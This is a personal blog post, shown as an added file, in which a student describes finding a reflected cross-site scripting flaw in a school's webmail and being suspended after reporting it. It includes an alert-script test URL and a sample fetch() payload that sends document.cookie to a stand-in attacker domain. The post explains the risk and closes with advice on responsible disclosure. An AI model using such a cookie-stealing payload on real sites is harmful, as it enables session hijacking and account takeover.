@@ -1,0 +1,60 @@
+---
+title: "I got suspended for doing the right thing."
+publishedAt: 1656992369870
+description: "And why no good deed goes unpunished."
+tags: ["coding", "cybersecurity", "hacking"]
+---
+
+# The backstory
+
+In typical American high schools, you are assigned an email address on your school's domain and allocated an inbox using something like GSuite or Microsoft office.
+This same thing happened at my school, but we would use the in-house solution that I'll call XMail. The XMail interface was simple, a table with your emails and a button to send a new one. You get the idea.
+
+<XMailTable />
+
+The interesting part of this story came when I needed to send an email to one of my teachers. After hitting send, a banner appeared displaying the text "Email sent successfully". But something immediately caught my eye.
+The way this worked was by modifying the URL to include a query parameter containing the banner text, like this `https://school.org/XMail?message=sent%20successfully`. This leads right into what the problem was.
+
+# The vulnerability
+
+In the various places I had worked, I tinkered around with security and knew what the best practices were for building websites. Which is why such a brazen display of injecting user input without serialization into a webpage made me curious right away. I immediately started tinkering around and found that by modifying this query parameter, you can put _anything_ you want in the banner, even HTML.
+Something like `https://school.org/XMail?message=<script>alert("hi!")</script>` will prompt an alert on the page of whoever opens the link. This is a glaring problem.
+Why? Because of something called a [Cross Site Scripting Attack (XSS)](https://owasp.org/www-community/attacks/xss/). The way this works is that an untrusted script is injected into an otherwise trusted site without the user's knowledge or consent.
+In this situation, it means an attacker can send someone a link to XMail with a specially crafted payload encoded, and when the user clicks the link they'll be directed to XMail, but without knowing it, malicious code is running on their browser. This is especially dangerous because of the way the school website worked, where _session IDs were not stored in an [HttpOnly cookie](https://owasp.org/www-community/HttpOnly)_, allowing an attacker access to a user's cookies using `document.cookie`.
+The attacker can then make a HTTP request to a remote server and send that cookie over, using an example payload encoded into the URL like this:
+
+<CodeBlock code={`fetch("http://someotherdomainIown.com/receive-cookies", {
+  method: "POST",
+  mode: "no-cors",
+  body: document.cookie,
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded "
+  }
+});`} />
+
+With this session ID in hand, the attacker can then authenticate themselves as the user without them knowing. To them, they just clicked on a link that took them to their email, but to an attacker, they now have full access to their account. This meant someone could target a student, a teacher, or even a principal. Everyone was at risk.
+This had the potential of costing the school district tens of thousands of dollars.
+
+# The report
+
+As soon as I confirmed my suspicions, I drafted an email to send to my Principal explaining the situation at hand and steps they could take to fix the vulnerability (all of the school JS files were unobfuscated). I sent it off thinking I had done my good deed for the day and headed to bed. I woke up on the following Monday as always, dreading going to school. For the most part, it was a normal day.
+About halfway through the day, I was called down to the main office to meet with the Principal. It wasn't a shock to me, as I assumed they would want to follow up with me to get some additional information.  
+
+This first meeting was nothing special, it consisted mainly of "How did you come across this?", "How did you figure this out?", and "Thanks for bringing this to our attention". That was that, and after some handshakes and some patting on the back, I went back to class.
+I was then called down the following day, which immediately struck me as odd. I thought everything that needed to be said was said and that everyone would move on. I was asked to elaborate in more detail about the vulnerability, with the Principal scribing various notes on his notepad -- which should have tipped me off to be more careful about what I was telling him. Instead, as naive as I was, I told him the story again, with full honesty and transparency.
+This was a lesson to me that when a person of authority is actively writing down everything you are saying, take a moment to figure out whether this is in your interest or not. Moving on, the meeting concluded and he thanked me once more for my cooperation. I went back to class and thought "okay, maybe that was just for record-keeping and now I can finally move on". This was where I was sorely mistaken.
+
+# The day of judgment
+
+The _next_ day, I was called down for the third time, which immediately let me know things were not okay. The Principal sat me down and said that while the school district was impressed with what I did, they wanted to pursue punishment for what they call a "violation of the student code of conduct".
+It turns out, that the second I ran `https://school.org/XMail?message=<script>alert("hi!")</script>` in the URL bar, I was in direct violation of the Student Code of Conduct. While what I did was not explicitly outlined, they used what's called an "elastic clause". It essentially meant that the district reserved the right to punish any behavior that they deem unfavorable, even if it wasn't outlined in the code of conduct.
+The district had some deliberation on what punishment they wanted to give me, and they landed on around 2-3 weeks of suspension and district computer privileges revoked.  
+
+I was dumbfounded. I thought my creativity and knowledge were something to be appreciated, something to be thanked for, not something to be punished for. The district had actually suffered a data breach earlier in the year, and according to the local news, had spent over $10k in investigation, remediation, and cleanup efforts. In my eyes, I thought that I saved the district from going through the same thing once again. However, they were not on the same page.
+Thankfully, my Principal was somewhat on my side. He rallied on my behalf to get me a less severe punishment. He was able to negotiate the punishment down to one day, which I was extremely grateful for. I didn't count it as a victory quite yet though. I began drafting a letter of appeal to the district's Board of Education with my AP Government teacher. However, that didn't go far as they essentially responded with "too bad, so sad".
+In the end, I served that one day of suspension and completed more school work in that one day of suspension than I had in the past two weeks of regular school. One might call it a silver lining.
+
+# The takeaway
+
+This experience taught me a lot about responsible reporting procedures as I discussed the situation afterward with my mentors from Discord. In the future, if you suspect there's a vulnerability in a website, do the responsible thing and get in contact with the site's admin instead of trying it beforehand without clearance. To end this, I have no qualms with the school district.
+However, the steps they took to punish me set a precedent for all the other students that it's a risky idea to go looking for bugs. I wish the best of luck to the next student in that school district who comes across a similar vulnerability.
